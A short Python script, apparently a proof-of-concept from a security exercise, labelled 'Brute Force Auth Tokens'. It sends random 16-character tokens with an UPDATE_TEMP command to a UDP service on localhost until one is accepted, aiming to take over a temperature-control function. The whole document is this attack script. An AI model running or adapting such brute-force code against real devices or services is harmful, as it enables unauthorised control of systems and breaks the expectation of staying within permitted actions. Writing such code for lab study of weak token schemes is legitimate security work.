#Vulnerability Name - Brute Force Auth Tokens
import socket
import random
import string

def updateTemp(p) :
    s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    foundToken = False

    while foundToken == False:
        token = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))

        s.sendto(token + ";UPDATE_TEMP", ("127.0.0.1", p))
        msg, addr = s.recvfrom(1024)
      
        if(msg != "Bad Token\n"):
            foundToken = True
    return token

try:
    
    infPort = 23456
    incPort = 23457
    incToken = updateTemp(incPort)
    assert(incToken != None)
except Exception as ex:
    print (ex)
    